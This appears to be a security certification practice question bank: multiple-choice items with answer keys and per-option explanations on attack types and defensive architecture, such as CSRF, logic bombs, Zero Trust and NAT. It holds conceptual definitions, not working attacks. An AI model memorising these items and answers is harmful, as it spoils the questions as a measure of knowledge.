  {id:101,domain:T,question:"What is typosquatting?",options:["Stealing authenticated browser session tokens to impersonate a logged-in user without knowing their credentials","Registering domains with common misspellings of legitimate sites to deceive users","Injecting forged DNS responses into a resolver's cache to redirect traffic to attacker-controlled IP addresses","Inserting malicious scripts or backdoors directly into the source code of a legitimate website"],answer:1,explanation:"Typosquatting registers domains like 'googlle.com' hoping users mistype a URL and land on the malicious site.",optionExplanations:["Stealing authenticated session tokens to impersonate a logged-in user describes session hijacking, not typosquatting.","Typosquatting exploits common typographical mistakes to register deceptive domain names that mimic legitimate ones.","Injecting forged DNS responses to redirect traffic describes DNS cache poisoning or spoofing, not typosquatting.","Inserting malicious scripts directly into a legitimate website's code describes a web application compromise or watering hole attack."]},
  {id:102,domain:T,question:"Which term describes when an attacker pretends to be an executive in an email to trick employees into transferring funds?",options:["Spear phishing","Whaling","Business email compromise (BEC)","Smishing"],answer:2,explanation:"BEC (Business Email Compromise) specifically targets organizations by impersonating executives to authorize fraudulent transfers.",optionExplanations:["Spear phishing is personalized phishing; BEC is a subset targeting financial fraud via executive impersonation.","Whaling is phishing that targets executives as the victims, not impersonating them to attack others.","BEC impersonates executives or vendors to manipulate employees into making unauthorized financial transfers.","Smishing uses SMS messages; BEC is specifically email-based financial fraud."]},
  {id:103,domain:T,question:"What is an indicator of compromise (IoC)?",options:["A list of approved firewall rules","Evidence suggesting a system has been breached or is under attack","A type of malware","A vulnerability scan result"],answer:1,explanation:"IoCs are artifacts like suspicious IPs, malware hashes, or unusual log entries that indicate a possible compromise.",optionExplanations:["Approved firewall rules are security configuration items, not compromise indicators.","IoCs are forensic artifacts — IP addresses, file hashes, domain names, or behavioral patterns — indicating compromise.","Malware is the threat itself; IoCs are the evidence artifacts left by malware or attacks.","Vulnerability scan results indicate weaknesses; IoCs indicate active compromise or attack."]},
  {id:104,domain:T,question:"What is shimming in the context of malware?",options:["A software compatibility shim technique that replaces deprecated API calls with updated equivalents for newer operating systems","Malware that inserts itself between a legitimate application and its dependencies to intercept calls","A network bridging technique that connects two separate Layer 2 network segments by forwarding frames between physical interfaces","A steganography technique that conceals secret data within digital image files by manipulating least-significant bits of pixel values"],answer:1,explanation:"Shimming malware inserts a malicious layer between an application and the OS/API to intercept function calls.",optionExplanations:["This describes a legitimate software compatibility layer, not malware; shimming as malware specifically intercepts calls to steal data or inject code.","Shimming inserts malicious code as a compatibility layer to intercept API calls between applications and system libraries.","Bridging connects network segments at Layer 2 and is a networking concept unrelated to malware shimming.","Steganography hides data inside media files; shimming malware instead inserts itself as an intermediary to intercept API calls."]},
  {id:105,domain:T,question:"Which of the following BEST describes a fileless malware attack?",options:["Malware stored in hidden files on disk","Malware that runs entirely in memory without writing files to disk","Malware that deletes itself after execution","Malware hidden inside image files"],answer:1,explanation:"Fileless malware operates in RAM using legitimate system tools (e.g., PowerShell), leaving no files on disk.",optionExplanations:["Hidden disk files are traditional malware; fileless malware specifically avoids disk writes.","Fileless malware runs in memory leveraging tools like PowerShell or WMI, evading file-based antivirus detection.","Self-deleting malware reduces traces but still touches the disk; fileless malware never writes files.","Malware hidden in images uses steganography; fileless malware avoids disk entirely."]},
  {id:106,domain:T,question:"What is a rainbow table attack?",options:["Systematically testing character combinations against wireless network authentication to recover the WPA2 pre-shared key","Using precomputed hash values to reverse password hashes faster than brute force","Submitting randomly generated password attempts against a live login form at high speed to gain unauthorized access","Capturing hashed authentication credentials as they traverse the network using a packet capture tool"],answer:1,explanation:"Rainbow tables are precomputed lists of plaintext-to-hash mappings, used to quickly reverse unsalted password hashes.",optionExplanations:["Systematically testing character combinations against wireless authentication describes a WPA2 brute force attack, not a rainbow table attack.","Rainbow tables use precomputed hash chains to find the plaintext behind a hash without recomputing each guess.","Submitting randomly generated passwords against a live login form is an online brute force attack.","Capturing hashed credentials on the wire is a network sniffing attack; rainbow tables are used offline after capturing hashes."]},
  {id:107,domain:T,question:"Which type of attack sends unsolicited Bluetooth messages to nearby devices?",options:["Bluesnarfing","Bluejacking","Evil twin","Bluebugging"],answer:1,explanation:"Bluejacking sends unsolicited messages (like contact cards) to nearby Bluetooth-enabled devices.",optionExplanations:["Bluesnarfing illegally accesses and downloads data from a Bluetooth device without permission.","Bluejacking sends unsolicited messages to nearby Bluetooth devices — generally annoying but not data-stealing.","Evil twin is a rogue Wi-Fi AP attack, not a Bluetooth attack.","Bluebugging takes full control of a Bluetooth device, including calls and messages — more severe than bluejacking."]},
  {id:108,domain:T,question:"What is a cross-site request forgery (CSRF) attack?",options:["Injecting malicious scripts into web pages viewed by other users","Tricking a user's browser into making unauthorized requests to a site where they are authenticated","Capturing authentication tokens from network traffic by using ARP spoofing to redirect sessions through an attacker-controlled host","Injecting malicious SQL statements into database queries by submitting unsanitized input through web application form fields"],answer:1,explanation:"CSRF tricks an authenticated user's browser into making unwanted requests to a trusted site, leveraging existing session tokens.",optionExplanations:["Injecting malicious scripts is XSS, not CSRF.","CSRF forces an authenticated user's browser to perform actions on a site they're logged into without their knowledge.","This describes session hijacking via ARP spoofing, not CSRF; CSRF abuses existing authenticated sessions rather than stealing tokens from the network.","This describes SQL injection, not CSRF; CSRF exploits a user's authenticated browser session rather than manipulating database queries."]},
  {id:109,domain:T,question:"What does 'pivoting' mean in a penetration test?",options:["Switching an attacker's methodology from external perimeter reconnaissance to exploiting services on the internal corporate network","Using a compromised host as a launching point to attack other systems on the network","Exploiting local kernel vulnerabilities or misconfigured SUID binaries to elevate from a standard user to root on a single host","Deleting event logs, removing attacker tools, and clearing shell history to prevent forensic reconstruction of post-exploitation activity"],answer:1,explanation:"Pivoting uses a compromised system as a relay to reach and attack otherwise inaccessible network segments.",optionExplanations:["Changing attack methodology describes a general strategy shift, not specifically pivoting; pivoting requires using a compromised host as the transit point.","Pivoting leverages a compromised host to tunnel traffic and reach internal hosts not directly accessible from the internet.","This describes privilege escalation on one system, a separate step; pivoting moves laterally to other systems using an already-compromised host as a launchpad.","This describes anti-forensics and covering tracks, a separate post-exploitation phase; pivoting is about reaching new network targets, not concealing activity."]},
  {id:110,domain:T,question:"Which of the following BEST describes a man-in-the-middle (MITM) attack prevention?",options:["Using complex passwords","Implementing certificate pinning and mutual TLS","Updating firewall rules","Enabling two-factor authentication only"],answer:1,explanation:"Certificate pinning and mutual TLS ensure both parties verify each other's certificates, preventing MITM interception.",optionExplanations:["Complex passwords protect against credential attacks but not MITM interception of traffic.","Certificate pinning and mutual TLS prevent MITM by requiring both client and server to authenticate certificates.","Firewall rules control network traffic flow but do not prevent MITM attacks within allowed traffic streams.","2FA verifies identity at login but does not prevent in-transit communication interception."]},
  {id:111,domain:T,question:"Which of the following is a passive reconnaissance technique?",options:["Port scanning the target","Sending phishing emails","Researching a company's public website and social media","Attempting to log in with default credentials"],answer:2,explanation:"Passive reconnaissance gathers information without directly interacting with target systems (OSINT, public records).",optionExplanations:["Port scanning directly probes target systems, making it active reconnaissance.","Phishing is an active attack, not reconnaissance.","Reviewing public websites and social media is OSINT — passive, with no direct interaction with target systems.","Attempting logins is active and may trigger alarms."]},
  {id:112,domain:T,question:"What is the purpose of a honeypot?",options:["Maintain redundant copies of production data in an isolated repository protected against accidental deletion or corruption","Lure attackers to a decoy system to observe and analyze their techniques","Provide encrypted communication tunnels for remote users connecting to the corporate network","Inspect inbound and outbound network packets and automatically block sessions matching malicious threat signatures"],answer:1,explanation:"Honeypots are intentionally vulnerable decoy systems designed to attract attackers and study their behavior.",optionExplanations:["Maintaining redundant data copies describes a backup repository; honeypots are decoy systems, not storage resources.","A honeypot is a decoy resource designed to detect, distract, and study attackers without risk to real systems.","Providing encrypted tunnels for remote users describes a VPN solution, not a honeypot.","Inspecting packets and blocking malicious sessions describes an intrusion prevention system, not a honeypot."]},
  {id:113,domain:T,question:"An attacker intercepts encrypted HTTPS traffic for later decryption. What type of attack is this?",options:["Replay attack","Pass-the-hash","SSL stripping","Capture now, decrypt later"],answer:3,explanation:"'Harvest now, decrypt later' (capture now, decrypt later) saves encrypted traffic hoping to decrypt it when keys are available or quantum computing matures.",optionExplanations:["A replay attack resends captured credentials or tokens; it does not store encrypted traffic for future decryption.","Pass-the-hash steals NTLM hashes for authentication without knowing the plaintext.","SSL stripping downgrades HTTPS to HTTP in real time; it doesn't capture for later decryption.","'Capture now, decrypt later' stockpiles encrypted data to decrypt once decryption capability becomes available."]},
  {id:114,domain:T,question:"What is tailgating in physical security?",options:["Sending an email impersonating a colleague","Following an authorized person through a secure door without authentication","Monitoring an employee's computer remotely","Planting a USB drive in a parking lot"],answer:1,explanation:"Tailgating (piggybacking) bypasses physical access controls by following an authorized person through a secured entry.",optionExplanations:["Email impersonation is phishing or BEC, not a physical attack.","Tailgating exploits social courtesy to physically bypass access controls without badging in.","Remote computer monitoring is a cyber technique, not physical tailgating.","Planting a USB drive is a baiting attack."]},
  {id:115,domain:T,question:"Which of the following BEST describes a logic bomb?",options:["Malware that encrypts victim files using a symmetric key and demands cryptocurrency ransom for the decryption key","Code that executes a malicious payload when a specific condition is met","Self-replicating malware that propagates between Bluetooth-enabled devices without requiring user interaction","A destructive virus that immediately overwrites or deletes files on the host system upon execution"],answer:1,explanation:"Logic bombs trigger on conditions like a date, time, or event — e.g., deleting files if an employee account is disabled.",optionExplanations:["Malware encrypting files for cryptocurrency ransom describes ransomware; a logic bomb's defining trait is conditional execution, not encryption.","A logic bomb stays dormant until a specific trigger condition is met before executing its payload.","Malware spreading autonomously between Bluetooth-enabled devices describes a Bluetooth worm, not a logic bomb.","A virus that immediately destroys files upon execution is a wiper; logic bombs delay their action until a trigger event."]},
  {id:116,domain:T,question:"An employee copies sensitive company data to a personal USB drive before leaving. What type of threat is this?",options:["External threat","Insider threat","Zero-day attack","Supply chain attack"],answer:1,explanation:"Malicious or negligent behavior by an internal employee or contractor constitutes an insider threat.",optionExplanations:["External threats originate outside the organization; this employee is an insider.","An insider threat involves an employee, contractor, or trusted person who misuses their access.","Zero-day attacks exploit unknown vulnerabilities in software; this is data theft by an insider.","Supply chain attacks compromise vendors or products before delivery; this is internal data theft."]},
  {id:117,domain:T,question:"What is a pharming attack?",options:["Distributing large volumes of deceptive emails impersonating trusted brands to trick recipients into revealing credentials","Redirecting users from legitimate websites to malicious ones via DNS manipulation","Embedding malicious code in email attachments that executes when the recipient opens the file or enables macros","Creating a rogue wireless access point with the same SSID as a legitimate network to intercept user traffic"],answer:1,explanation:"Pharming corrupts DNS settings or poisons caches to redirect users to malicious sites even when they type the correct URL.",optionExplanations:["Distributing deceptive emails impersonating trusted brands describes mass phishing, not pharming.","Pharming redirects traffic at the DNS level, so even correct URLs resolve to attacker-controlled sites.","Embedding malicious code in email attachments that executes when opened describes email-based malware delivery.","Creating a rogue AP with the same SSID as a legitimate network describes an evil twin attack."]},
  {id:118,domain:T,question:"Which of the following is an example of a brute force attack?",options:["Inserting malicious SQL syntax into a web application's login field to bypass authentication database queries","Trying every possible password combination until one works","Stealing an authenticated browser session cookie from network traffic to impersonate a logged-in user","Manipulating a help desk employee into resetting an account password by fabricating a plausible identity"],answer:1,explanation:"A brute force attack systematically tries all possible combinations of characters until the correct password is found.",optionExplanations:["Inserting malicious SQL into a login field to bypass authentication describes SQL injection, not brute force.","Brute force exhaustively tries every possible password combination until finding the correct one.","Stealing an authenticated session cookie from traffic to impersonate a user describes session hijacking.","Manipulating a help desk employee to reset an account describes social engineering."]},
  {id:119,domain:T,question:"What distinguishes a worm from a virus?",options:["Worms require a host file to spread; viruses do not","Viruses spread automatically over networks; worms require user interaction","Worms self-replicate and spread independently; viruses need to attach to a host file","Worms must attach to an executable host file to spread; viruses propagate autonomously across network connections without a host"],answer:2,explanation:"Worms are self-contained and self-propagating; viruses require a host file and user action to spread.",optionExplanations:["It is viruses that require a host file; worms are self-contained.","Viruses require user action (opening an infected file); worms spread autonomously.","A worm self-replicates and propagates across networks without user interaction or a host file.","This reverses the definitions; worms spread autonomously without a host file, while viruses require a host file to attach to and propagate."]},
  {id:120,domain:T,question:"Which attack technique uses multiple systems to overwhelm a target?",options:["APT","DDoS","MITM","Spear phishing"],answer:1,explanation:"DDoS (Distributed Denial of Service) uses botnets of many systems to flood a target with traffic.",optionExplanations:["APTs are prolonged stealthy intrusions; they don't necessarily use volume-based flooding.","DDoS distributes the attack across many compromised systems to amplify the flood against a single target.","MITM intercepts communication between two parties; it doesn't require many attacking systems.","Spear phishing is a targeted social engineering email attack, not a multi-system flooding attack."]},
  {id:121,domain:T,question:"What does OSINT stand for and what is its primary use in security?",options:["On-Site Intelligence — used for physical penetration testing","Open Source Intelligence — gathering information from public sources for reconnaissance","Operational Security Intelligence — protecting classified data","Online Security Intelligence — monitoring dark web forums"],answer:1,explanation:"OSINT collects intelligence from publicly available sources (social media, websites, job postings) for reconnaissance.",optionExplanations:["On-Site Intelligence is not a real security term; OSINT does not stand for that.","OSINT (Open Source Intelligence) uses publicly available data to learn about targets before attacking.","Operational Security (OPSEC) protects sensitive operational information; OSINT is about gathering it.","While OSINT can include dark web, it is not limited to online monitoring."]},
  {id:122,domain:T,question:"Which of the following is a characteristic of spyware?",options:["Encrypts user files for ransom","Covertly monitors user activity and transmits data to a third party","Replicates itself across the network","Displays unwanted advertisements"],answer:1,explanation:"Spyware secretly observes user behavior, keystroke logging, browsing, and transmits data to the attacker.",optionExplanations:["File encryption for ransom is ransomware.","Spyware covertly collects and exfiltrates user information such as credentials, browsing history, and personal data.","Self-replication across networks is a worm behavior.","Displaying unwanted ads is adware."]},
  {id:123,domain:T,question:"A SCADA system at a power plant is attacked, causing physical damage to turbines. Which type of attack is this?",options:["Ransomware attack","Cyber-physical attack","Phishing attack","DDoS attack"],answer:1,explanation:"Cyber-physical attacks target industrial control systems (ICS/SCADA) to cause physical harm to equipment or infrastructure.",optionExplanations:["Ransomware encrypts data for extortion; it does not typically cause physical equipment damage.","A cyber-physical attack uses cyber means to cause real-world physical consequences, as seen in Stuxnet.","Phishing is a social engineering technique to steal credentials, not to damage physical equipment.","DDoS disrupts availability of services; it does not directly cause physical equipment damage."]},
  {id:124,domain:T,question:"What is the difference between a vulnerability and an exploit?",options:["A vulnerability and an exploit are interchangeable security terms both describing the same exploitable flaw within a target system","A vulnerability is a weakness; an exploit is the code or technique that takes advantage of it","An exploit is a weakness; a vulnerability is the attack tool","A vulnerability is the attack tool leveraged to compromise systems; an exploit is the underlying weakness discovered by security scanners"],answer:1,explanation:"A vulnerability is the flaw (weakness); an exploit is the method or code that leverages that flaw to attack.",optionExplanations:["They are not the same; a vulnerability is a weakness that exists, while an exploit is the specific code or method used to take advantage of it.","A vulnerability is the underlying weakness in software or configuration; an exploit weaponizes that weakness.","An exploit uses the vulnerability, not the other way around.","This reverses the definitions; a vulnerability is the weakness, and an exploit is the technique that leverages the vulnerability to cause harm."]},
  {id:125,domain:T,question:"Which threat vector uses text messages to deliver phishing attacks?",options:["Vishing","Phishing","Smishing","Whaling"],answer:2,explanation:"Smishing = SMS phishing — malicious links or prompts sent via text message.",optionExplanations:["Vishing uses voice calls (phone) for phishing.","Phishing is the general email-based version.","Smishing specifically uses SMS text messages to deliver phishing content.","Whaling targets executives as the victims, regardless of delivery channel."]},
  {id:126,domain:A,question:"What is the purpose of a DMZ in network security?",options:["Encrypt traffic between internal users","Host publicly accessible services while isolating the internal network","Store backup copies of data","Provide wireless network access"],answer:1,explanation:"A DMZ (Demilitarized Zone) places public-facing servers between two firewalls, protecting the internal network.",optionExplanations:["Traffic encryption is provided by VPNs and TLS, not a DMZ architecture.","A DMZ isolates public-facing services (web, email, DNS) from the internal corporate network using firewall layers.","Backups are stored in separate backup repositories, not DMZs.","Wireless access is provided by access points and controllers, not a DMZ."]},
  {id:127,domain:A,question:"What is network segmentation?",options:["Encrypting all network traffic","Dividing a network into smaller isolated segments to limit lateral movement","Combining multiple networks into one","Installing firewalls at every endpoint"],answer:1,explanation:"Segmentation divides a network into zones (e.g., VLANs) so a breach in one segment cannot easily spread to others.",optionExplanations:["Encrypting network traffic is a separate control from segmentation.","Segmentation isolates network zones so attackers who compromise one segment cannot freely move to others.","Combining networks is consolidation; segmentation is the opposite.","Firewalls at every endpoint describe host-based firewalls, not network segmentation."]},
  {id:128,domain:A,question:"What is a VLAN?",options:["A physical network switch","A virtual network that groups devices logically regardless of physical location","A type of VPN protocol","A wireless network standard"],answer:1,explanation:"A VLAN (Virtual Local Area Network) groups devices logically, enabling segmentation without physical rewiring.",optionExplanations:["A physical network switch is hardware; VLANs are logical configurations on that hardware.","A VLAN groups devices into a logical network segment, independent of physical switch port location.","VPN protocols (IPsec, SSL) create encrypted tunnels; VLANs are logical LAN partitions.","Wireless standards (802.11a/b/g/n/ac/ax) define radio frequencies and speeds, not logical LAN groupings."]},
  {id:129,domain:A,question:"What is the function of an intrusion prevention system (IPS)?",options:["Passively observe network traffic and generate alert notifications for analysts without taking any blocking action","Actively block or drop malicious traffic in real time","Aggregate and retain event logs from network devices for long-term forensic investigation and compliance reporting","Create encrypted IPsec tunnels between geographically separated sites to protect data traversing public networks"],answer:1,explanation:"Unlike an IDS (which only alerts), an IPS actively drops or blocks malicious traffic in line.",optionExplanations:["Passively observing traffic and generating alerts without taking blocking action describes an IDS, not an IPS.","An IPS is inline with the traffic flow and can block, drop, or rate-limit malicious traffic in real time.","Aggregating and retaining logs for forensic investigation describes a SIEM or log management platform.","Creating encrypted IPsec tunnels between sites describes a VPN solution; an IPS inspects plaintext traffic after decryption."]},
  {id:130,domain:A,question:"Which cloud service model provides virtualized infrastructure (servers, storage, networking) as a service?",options:["Software as a Service (SaaS)","Platform as a Service (PaaS)","Infrastructure as a Service (IaaS)","Function as a Service (FaaS)"],answer:2,explanation:"IaaS provides raw compute, storage, and networking; the customer manages OS, apps, and data.",optionExplanations:["SaaS delivers complete software applications to users over the internet (e.g., Microsoft 365, Salesforce).","PaaS provides a platform (OS, middleware, runtime) for developers to build and deploy apps.","IaaS provides virtualized infrastructure components — the customer controls everything from the OS up.","FaaS (serverless) executes individual functions; it is a subset of PaaS."]},
  {id:131,domain:A,question:"What is the shared responsibility model in cloud computing?",options:["The cloud provider is responsible for everything","Security responsibilities are divided between the cloud provider and the customer","The customer bears all security responsibility","Only applies to government cloud deployments"],answer:1,explanation:"In shared responsibility, the provider secures the cloud infrastructure; the customer secures what they put in the cloud.",optionExplanations:["The cloud provider is responsible for physical security, hypervisor, and underlying infrastructure — not everything.","Shared responsibility divides security duties: the provider handles infrastructure; the customer handles data, identity, and apps.","The customer is responsible for what they configure and deploy, but the provider owns physical and virtualization security.","The shared responsibility model applies to all cloud deployments regardless of sector."]},
  {id:132,domain:A,question:"What is a CASB (Cloud Access Security Broker)?",options:["A hardware-based perimeter security appliance that filters all inbound and outbound traffic at the boundary of cloud deployments","Software that sits between users and cloud services to enforce security policies","A type of VPN for cloud access","A subscription-based antivirus product deployed as a cloud-hosted virtual machine agent to scan workloads for malware infections"],answer:1,explanation:"A CASB enforces policies (DLP, authentication, encryption) between cloud users and cloud services.",optionExplanations:["A hardware appliance guards a network boundary but does not sit between users and cloud services enforcing per-app policies the way a CASB does.","A CASB acts as a gatekeeper between users and cloud apps, enforcing policies like DLP, MFA, and encryption.","VPNs create encrypted tunnels; a CASB inspects and controls cloud application traffic.","A cloud antivirus scans for malware but does not broker access between users and SaaS services or enforce cloud-specific security policies."]},
  {id:133,domain:A,question:"What is a software-defined perimeter (SDP)?",options:["A physical firewall at the network edge","A security framework that creates on-demand, per-session encrypted connections hiding infrastructure","A VLAN spanning all network devices","An SDN controller for network routing"],answer:1,explanation:"SDP (zero-trust access) makes infrastructure invisible to unauthorized users and creates encrypted tunnels per session.",optionExplanations:["Physical firewalls define a fixed perimeter; SDP creates dynamic, user-specific perimeters.","SDP hides infrastructure from unauthorized users and creates authenticated, encrypted channels per connection.","VLANs are network segmentation tools; SDP is an access architecture.","SDN controllers manage network topology; SDP controls who can access what in a zero-trust way."]},
  {id:134,domain:A,question:"Which of the following is a key principle of Zero Trust architecture?",options:["Grant implicit trust to all users and devices that originate from within the corporate network perimeter without further verification","Never trust, always verify — verify every user, device, and request regardless of location","Consolidate security architecture by replacing multiple distributed perimeter firewalls with a single centralized security gateway appliance","Permit unrestricted lateral movement between all internal hosts once the network perimeter firewall has been successfully established"],answer:1,explanation:"Zero Trust eliminates implicit trust — every access request must be authenticated and authorized regardless of origin.",optionExplanations:["Trusting internal users by default is the traditional perimeter model that Zero Trust explicitly rejects; every request must be verified regardless of source.","Zero Trust requires continuous verification of identity, device health, and least-privilege access for every request.","Reducing firewalls is an architectural simplification, not a Zero Trust principle; Zero Trust focuses on continuous verification, not perimeter consolidation.","Allowing all LAN traffic is the opposite of Zero Trust; the model requires granular, continuous verification for every request regardless of network location."]},
  {id:135,domain:A,question:"What is a stateful firewall?",options:["A firewall that only filters based on IP addresses","A firewall that tracks the state of network connections and allows return traffic automatically","A next-generation firewall that examines application-layer packet payloads using deep packet inspection to identify and block specific protocols","A packet filter that permits only traffic initiated from the external untrusted network into the trusted internal network"],answer:1,explanation:"A stateful firewall tracks connection state tables and permits return traffic that belongs to established sessions.",optionExplanations:["Filtering only by IP is a packet-filtering firewall, the most basic type.","A stateful firewall tracks connection state (SYN, ESTABLISHED, FIN) to permit legitimate return traffic automatically.","Deep packet inspection at Layer 7 is an NGFW feature, not a defining trait of stateful firewalls, which operate primarily at Layers 3 and 4.","Allowing only inbound traffic would block all outbound communication; stateful firewalls allow return traffic for established sessions initiated from the inside."]},
  {id:136,domain:A,question:"What is the function of a next-generation firewall (NGFW)?",options:["Only filter traffic by port and protocol","Inspect traffic at the application layer, identify users, and enforce application-level policies","Terminate encrypted remote access VPN tunnels for employees connecting from outside the corporate network to reach internal resources","Translate private internal IP addresses to a shared public IP address to allow internal hosts to reach the internet"],answer:1,explanation:"NGFWs combine stateful inspection with DPI, application awareness, user identity, and IPS capabilities.",optionExplanations:["Port and protocol filtering only is a traditional packet-filtering or stateful firewall capability.","NGFWs add deep packet inspection, application identification, user awareness, and integrated IPS beyond stateful inspection.","Terminating VPN tunnels is a VPN concentrator function; NGFWs can integrate VPN but their primary role is application-layer inspection and policy enforcement.","NAT is a standard router and firewall function but not the defining capability of an NGFW; NGFWs add application identification and user-based policy enforcement."]},
  {id:137,domain:A,question:"What is containerization in the context of application security?",options:["Encrypting individual files","Packaging an application and its dependencies into an isolated runtime environment","A method for segmenting network traffic","Virtualizing entire server hardware"],answer:1,explanation:"Containers (e.g., Docker) package apps with their dependencies into isolated environments sharing the host OS kernel.",optionExplanations:["File encryption is a data security control, not containerization.","Containerization isolates applications with their dependencies, improving portability and limiting the impact of compromise.","Network traffic segmentation uses VLANs and firewalls, not containers.","Virtualizing entire server hardware describes full virtual machines (hypervisor-based), not containers."]},
  {id:138,domain:A,question:"What is the primary security concern with serverless computing?",options:["Servers are not patched automatically","Insecure function code and misconfigurations can expose sensitive data","The cloud provider can read all data","Serverless functions cannot be encrypted"],answer:1,explanation:"Serverless shifts OS/infra patching to the provider but the customer is responsible for secure function code and IAM.",optionExplanations:["OS patching in serverless is handled by the provider; the customer is not responsible for that.","The main risk is insecure function code (injection vulnerabilities) and overly permissive IAM roles.","Reputable cloud providers have strong contractual and technical controls against accessing customer data.","Serverless data and code can be encrypted; encryption is supported and recommended."]},
  {id:139,domain:A,question:"Which of the following BEST describes microsegmentation?",options:["Dividing the network into a few large zones","Applying granular security policies to individual workloads or even specific flows","Encrypting micro-transactions","Installing firewalls at every router"],answer:1,explanation:"Microsegmentation creates fine-grained security zones down to individual workloads using software-defined policies.",optionExplanations:["A few large zones is traditional network segmentation, not microsegmentation.","Microsegmentation uses software-defined policies to isolate individual workloads, limiting lateral movement even within data centers.","Micro-transactions are a financial concept unrelated to network security.","Firewalls at routers provide perimeter control; microsegmentation applies inside the perimeter at the workload level."]},
  {id:140,domain:A,question:"What is infrastructure as code (IaC) and its main security implication?",options:["Documenting infrastructure designs using architecture diagrams and flowcharts to train administrators and developers on network topology concepts","Defining infrastructure via code files, meaning misconfigurations can be versioned and replicated at scale","Applying TLS and SSH encryption to all administrative management protocols to protect control-plane communications from eavesdropping","Using robotic assembly systems and automated cable management tools to physically construct and rack servers in data center facilities"],answer:1,explanation:"IaC provisions infrastructure via code (Terraform, CloudFormation); misconfigured templates can spread security flaws at scale.",optionExplanations:["Creating training diagrams is documentation, not IaC; infrastructure as code means machine-readable definition files that provision real infrastructure automatically.","IaC automates infrastructure provisioning through code, meaning one misconfigured template can replicate vulnerabilities everywhere.","Encrypting management protocols is a security hardening practice, not IaC; IaC defines the infrastructure itself through code files, not just its communications.","Physical data center automation is distinct from IaC; infrastructure as code provisions logical and virtual resources through software, not hardware assembly."]},
  {id:141,domain:A,question:"What security principle does a honeynet implement?",options:["Preventing attackers from entering the network","Luring attackers into a decoy network environment to monitor their techniques","Encrypting sensitive network segments","Providing redundant network paths"],answer:1,explanation:"A honeynet is multiple honeypots forming a fake network, used to study attacker behavior in a realistic environment.",optionExplanations:["Preventing attackers is the goal of perimeter security; a honeynet lets attackers in deliberately.","A honeynet creates a realistic decoy environment to observe attacker TTPs without risk to real systems.","Encrypting segments is VPN or VLAN security; a honeynet is a deception technology.","Redundant paths describe high availability architecture, not deception technology."]},
  {id:142,domain:A,question:"What is a site-to-site VPN?",options:["A VPN used by individual remote employees","A permanent encrypted tunnel connecting two entire networks (e.g., two office locations)","A VPN that only encrypts web traffic","A VPN that uses HTTPS for encryption"],answer:1,explanation:"A site-to-site VPN creates a persistent encrypted tunnel between two networks, typically using IPsec.",optionExplanations:["Individual remote user access is a remote access VPN (client-to-site), not site-to-site.","A site-to-site VPN permanently links two network locations so all traffic between them is encrypted.","Encrypting only web traffic describes SSL/TLS proxying, not a site-to-site VPN.","While TLS VPNs exist, site-to-site VPNs traditionally use IPsec IKEv2."]},
  {id:143,domain:A,question:"Which of the following is a benefit of using HTTPS over HTTP?",options:["Faster page loading speeds","Encryption and authentication of web traffic","Reduced server resource usage","Improved database query performance"],answer:1,explanation:"HTTPS uses TLS to encrypt traffic between client and server and authenticates the server via a certificate.",optionExplanations:["HTTPS adds TLS overhead; it is not faster than HTTP.","HTTPS provides encryption of traffic in transit and server identity authentication via digital certificates.","TLS processing adds CPU overhead, not reduced resource usage.","HTTPS secures the transport layer; it has no impact on database performance."]},
  {id:144,domain:A,question:"What is the purpose of network address translation (NAT)?",options:["Apply IPsec tunnel mode encryption to all traffic passing between internal corporate hosts and external internet-facing destination addresses","Map private IP addresses to one or more public IP addresses to allow internet access","Divide a flat corporate network into logically isolated broadcast domains using IEEE 802.1Q VLAN tagging and inter-VLAN routing","Require valid credentials and 802.1X certificate-based authentication before any host is permitted to obtain a network lease and connect"],answer:1,explanation:"NAT allows multiple devices with private IPs to share public IP addresses, providing connectivity and hiding internal addresses.",optionExplanations:["IPsec encrypts traffic in transit but does not translate addresses; NAT specifically remaps private IP addresses to public ones to enable internet routing.","NAT translates private internal IP addresses to a public IP address for internet communication.","VLANs segment network traffic into broadcast domains but do not translate addresses; NAT maps private addresses to public ones for internet access.","802.1X enforces access control at the port level before devices join the network; NAT remaps addresses after devices are already connected and communicating."]},
  {id:145,domain:A,question:"A company implements a WAF (Web Application Firewall). What does it primarily protect against?",options:["Network-layer DDoS attacks","Application-layer attacks such as SQL injection, XSS, and CSRF","Physical intrusion into the data center","Malware on employee endpoints"],answer:1,explanation:"A WAF inspects HTTP/S traffic and blocks web application attacks like SQLi, XSS, and CSRF.",optionExplanations:["Network-layer DDoS is mitigated by DDoS scrubbing services and network-layer firewalls, not WAFs.","WAFs analyze HTTP requests and responses to detect and block OWASP Top 10 attacks like SQLi and XSS.","Physical intrusion is addressed by physical security controls, not a WAF.","Endpoint malware is addressed by EDR and antivirus, not a WAF."]},
  {id:146,domain:A,question:"Which wireless attack creates an access point with the same SSID as a legitimate network to intercept traffic?",options:["Deauthentication attack","Evil twin attack","Bluejacking","War driving"],answer:1,explanation:"An evil twin AP broadcasts the same SSID as the legitimate network, tricking users into connecting to the attacker's AP.",optionExplanations:["A deauthentication attack disconnects clients from a legitimate AP; an evil twin then offers an alternative connection.","An evil twin creates a rogue AP with the same SSID to perform a MITM attack on wireless clients.","Bluejacking sends unsolicited Bluetooth messages; it is not a Wi-Fi attack.","War driving scans for open or weak Wi-Fi networks while driving; it doesn't create rogue APs."]},
  {id:147,domain:A,question:"What is the difference between IDS and IPS?",options:["IDS blocks traffic; IPS only monitors","IDS monitors and alerts; IPS monitors and actively blocks malicious traffic","They are identical","IPS is only for wireless networks"],answer:1,explanation:"An IDS detects and alerts on threats; an IPS sits inline and takes active blocking action.",optionExplanations:["It is IPS that blocks; IDS only monitors and alerts.","IDS (Intrusion Detection System) generates alerts; IPS (Intrusion Prevention System) actively blocks threats inline.","IDS and IPS serve different purposes: detection versus prevention.","Both IDS and IPS can be deployed on wired or wireless networks."]},
  {id:148,domain:A,question:"Which of the following BEST describes an air gap?",options:["A gap between firewall rules","Physical isolation of a system from all external networks","A network that uses wireless only","A type of VPN tunnel"],answer:1,explanation:"An air gap physically isolates a system so it has no network connection to external or untrusted networks.",optionExplanations:["Firewall rule gaps are misconfigurations, not intentional isolation.","An air-gapped system is completely disconnected from external networks, providing maximum isolation for sensitive systems.","Wireless-only networks are still connected networks, not air-gapped.","VPN tunnels connect networks through encryption; they do not isolate systems from networks."]},
